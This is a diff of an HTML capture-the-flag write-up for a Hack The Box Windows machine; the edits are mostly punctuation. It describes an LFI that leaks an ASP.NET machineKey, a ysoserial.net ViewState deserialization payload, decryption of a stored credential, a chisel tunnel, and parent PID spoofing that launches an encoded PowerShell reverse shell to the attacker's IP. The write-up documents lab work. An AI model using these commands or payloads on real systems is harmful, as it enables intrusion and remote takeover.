@@ -53,7 +53,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-pov/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -197,7 +197,7 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>Windows box, only port 80. The main site drops a subdomain in the contact section, and that subdomain has a portfolio with a CV download feature that doesn&rsquo;t sanitize the file path. Reading <code>web.config</code> through that LFI leaks the ASP.NET machineKey. From there the attack is elegant: the machineKey signs and encrypts ViewState, so with it you can forge a malicious ViewState that the server deserializes as trusted - and deserialization in .NET gives you code execution. The second half is about SeDebugPrivilege and parent PID spoofing, a technique that lets you inherit a SYSTEM token without touching lsass.</p>
+                <p>Windows box, only port 80. The main site drops a subdomain in the contact section, and that subdomain has a portfolio with a CV download feature that doesn&rsquo;t sanitize the file path. Reading <code>web.config</code> through that LFI leaks the ASP.NET machineKey. From there the attack is elegant: the machineKey signs and encrypts ViewState, so with it you can forge a malicious ViewState that the server deserializes as trusted, and deserialization in .NET gives you code execution. The second half is about SeDebugPrivilege and parent PID spoofing, a technique that lets you inherit a SYSTEM token without touching lsass.</p>
 <h2 id="recon">Recon</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/pov ❯ sudo nmap -sV -sC -T4 10.129.17.128
 </span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-07 19:51 +0100
@@ -211,21 +211,21 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: pov.htb
 </span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</span></span></code></pre></div><p>One port. The main site at <code>pov.htb</code> was a personal portfolio - a frontend with no interactive functionality. The contact section was the useful part:</p>
+</span></span></code></pre></div><p>One port. The main site at <code>pov.htb</code> was a personal portfolio, a frontend with no interactive functionality. The contact section was the useful part:</p>
 <p><img src="/images/writeups/htb-pov/web-contact-subdomain-hint.png" alt="pov.htb contact page with text pointing to dev.pov.htb subdomain and sfitz@pov.htb email"></p>
 <p><code>dev.pov.htb</code> spelled out in the page text, <code>sfitz@pov.htb</code> as the contact email. Added both to <code>/etc/hosts</code> and moved to the subdomain.</p>
 <h2 id="lfi-and-the-machinekey">LFI and the machineKey</h2>
 <p><code>dev.pov.htb</code> was a separate portfolio site. It had a &ldquo;Download CV&rdquo; button that sent a POST request with a <code>file</code> parameter. Taking it to Burp and changing the filename to a relative path showed it would load any file the web process could read:</p>
 <p><img src="/images/writeups/htb-pov/burp-lfi-download-cv-request.png" alt="Burp Suite POST request to dev.pov.htb triggering the file parameter LFI"></p>
-<p>The obvious target in an ASP.NET application is <code>web.config</code>. This is the application&rsquo;s main configuration file - database connection strings, custom settings, and crucially, the <code>machineKey</code> element that controls how the app handles cryptographic operations.</p>
+<p>The obvious target in an ASP.NET application is <code>web.config</code>. This is the application&rsquo;s main configuration file, database connection strings, custom settings, and crucially the <code>machineKey</code> element that controls how the app handles cryptographic operations.</p>
 <p>Requesting <code>../../web.config</code> through the LFI gave this response:</p>
 <p><img src="/images/writeups/htb-pov/burp-webconfig-machinekey-leak.png" alt="Burp Suite response showing leaked web.config with ASP.NET machineKey decryption and validation keys"></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;machineKey</span> <span class="na">decryption=</span><span class="s">&#34;AES&#34;</span> 
 </span></span><span class="line"><span class="cl">  <span class="na">decryptionKey=</span><span class="s">&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> 
 </span></span><span class="line"><span class="cl">  <span class="na">validation=</span><span class="s">&#34;SHA1&#34;</span> 
 </span></span><span class="line"><span class="cl">  <span class="na">validationKey=</span><span class="s">&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span> <span class="nt">/&gt;</span>
-</span></span></code></pre></div><p>Here is what makes this key dangerous. ASP.NET uses a mechanism called <code>__VIEWSTATE</code> to preserve page state between requests. When you submit a form, the browser sends back a hidden field containing a base64-encoded blob that represents the state of every control on the page - which dropdown was selected, what was in a text field, and so on. To prevent clients from tampering with this blob (injecting different values, for example), ASP.NET signs and encrypts it using the machineKey before sending it to the browser, and verifies that signature before deserializing it on the way back in.</p>
-<p>The catch is the deserialization step. ASP.NET deserializes the ViewState blob using the .NET BinaryFormatter, which is a general-purpose object serializer. If you can forge a ViewState that passes the signature check - which you can, because you have the key - you can embed a .NET deserialization gadget chain inside it. When the server deserializes the blob, the gadget chain executes arbitrary code in the context of the IIS worker process.</p>
+</span></span></code></pre></div><p>Here is what makes this key dangerous. ASP.NET uses a mechanism called <code>__VIEWSTATE</code> to preserve page state between requests. When you submit a form, the browser sends back a hidden field containing a base64-encoded blob that represents the state of every control on the page, which dropdown was selected, what was in a text field, and so on. To prevent clients from tampering with this blob (injecting different values, for example), ASP.NET signs and encrypts it using the machineKey before sending it to the browser, and verifies that signature before deserializing it on the way back in.</p>
+<p>The catch is the deserialization step. ASP.NET deserializes the ViewState blob using the .NET BinaryFormatter, which is a general-purpose object serializer. If you can forge a ViewState that passes the signature check, which you can, because you have the key, you can embed a .NET deserialization gadget chain inside it. When the server deserializes the blob, the gadget chain executes arbitrary code in the context of the IIS worker process.</p>
 <p><code>ysoserial.net</code> handles the gadget chain and the ViewState signing in one step. Built it locally, then generated the payload:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\t</span>ools<span class="se">\y</span>soserial.net&gt; ysoserial.exe -p ViewState <span class="sb">`</span>
 </span></span><span class="line"><span class="cl">  -g WindowsIdentity <span class="sb">`</span>
@@ -288,7 +288,7 @@ d-----       12/25/2023   2:24 PM                sfitz
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
 -a----       12/25/2023   2:26 PM           1838 connection.xml
-</code></pre><p>PSCredential XML is a Windows feature that lets you serialize a credential object to disk. The password is encrypted with DPAPI, which ties the encryption to the current user&rsquo;s login session - only the user who saved it can decrypt it, because only they have the right DPAPI master key. Running <code>Import-Clixml</code> as sfitz decrypted it cleanly:</p>
+</code></pre><p>PSCredential XML is a Windows feature that lets you serialize a credential object to disk. The password is encrypted with DPAPI, which ties the encryption to the current user&rsquo;s login session. Only the user who saved it can decrypt it, because only they have the right DPAPI master key. Running <code>Import-Clixml</code> as sfitz decrypted it cleanly:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Import-Clixml</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">connection</span><span class="p">.</span><span class="py">xml</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$cred</span><span class="p">.</span><span class="py">GetNetworkCredential</span><span class="p">().</span><span class="py">Password</span>
 </span></span><span class="line"><span class="cl"><span class="n">f8gQ8fynP44ek1m3</span>
@@ -344,10 +344,10 @@ SeDebugPrivilege              Debug programs                 Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 </code></pre><p>High Integrity Level and <code>SeDebugPrivilege</code> enabled.</p>
-<p>Normally Windows prevents you from opening a handle to a process owned by a different user. <code>SeDebugPrivilege</code> removes that restriction entirely - it lets you call <code>OpenProcess()</code> on any process on the system regardless of who owns it, including SYSTEM-level processes like <code>winlogon.exe</code>, <code>lsass.exe</code>, and <code>services.exe</code>.</p>
+<p>Normally Windows prevents you from opening a handle to a process owned by a different user. <code>SeDebugPrivilege</code> removes that restriction entirely. It lets you call <code>OpenProcess()</code> on any process on the system regardless of who owns it, including SYSTEM-level processes like <code>winlogon.exe</code>, <code>lsass.exe</code>, and <code>services.exe</code>.</p>
 <p>The technique here exploits how Windows handles process creation. When you create a new process, you can specify a parent process by PID using the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute. Windows then assigns the new process the access token of the specified parent rather than the token of the calling process. Child processes inherit their parent&rsquo;s token. If you create a process claiming <code>winlogon.exe</code> as its parent, the new process gets SYSTEM&rsquo;s token.</p>
 <p>To open a handle to <code>winlogon.exe</code> in the first place, you need <code>SeDebugPrivilege</code>. That&rsquo;s the link: <code>SeDebugPrivilege</code> lets you read the SYSTEM process, and the parent PID spoof makes your new process inherit its token.</p>
-<p>Before running the exploit, I tunneled WinRM through chisel. A bare RunasCs shell is a socket/pipe with no real network environment - the SYSTEM process spawned by psgetsys would inherit that empty environment and have no path to my tun0 IP. A proper WinRM session over a tunnel gave the child process a real network context to connect back through:</p>
+<p>Before running the exploit, I tunneled WinRM through chisel. A bare RunasCs shell is a socket/pipe with no real network environment. The SYSTEM process spawned by psgetsys would inherit that empty environment and have no path to my tun0 IP. A proper WinRM session over a tunnel gave the child process a real network context to connect back through:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/tunneling/chisel ❯ ./chisel server -p <span class="m">8001</span> --reverse
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\c</span>hisel_new.exe client 10.10.16.129:8001 R:5985:127.0.0.1:5985
@@ -373,7 +373,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 </span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>laading<span class="se">\D</span>ocuments&gt; ImpersonateFromParentPid -ppid <span class="m">556</span> -command <span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span> -cmdargs <span class="s2">&#34;/c powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADYALgAxADIAOQAiACwAOQA5ADkAOQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABvAD0AKABpAGUAeAAgACQAZAAgADIAPgAmADEAfABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAHMAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABvACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgAsADAALAAkAHMAYgAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA==&#34;</span>
 </span></span></code></pre></div><p>SYSTEM shell came back on the listener. Root flag.</p>
 <p><em>References: <a href="https://github.com/decoder-it/psgetsystem">github.com/decoder-it/psgetsystem</a>, <a href="https://pentestlab.blog/2020/02/24/parent-pid-spoofing/">pentestlab.blog - Parent PID Spoofing</a></em></p>
-<p>The PPID spoofing technique is the thing I&rsquo;d take from this box. Most people reach for token impersonation or process injection when they see SeDebugPrivilege, but the parent PID approach is different - you&rsquo;re not injecting code into another process at all. You&rsquo;re just creating a brand new process and claiming a SYSTEM process as its parent. Windows hands over the token because that&rsquo;s what token inheritance is supposed to do.</p>
+<p>The PPID spoofing technique is the thing I&rsquo;d take from this box. Most people reach for token impersonation or process injection when they see SeDebugPrivilege, but the parent PID approach is different. You&rsquo;re not injecting code into another process at all. You&rsquo;re just creating a brand new process and claiming a SYSTEM process as its parent. Windows hands over the token because that&rsquo;s what token inheritance is supposed to do.</p>
 
             </div>
         </article></main>
@@ -498,6 +498,11 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
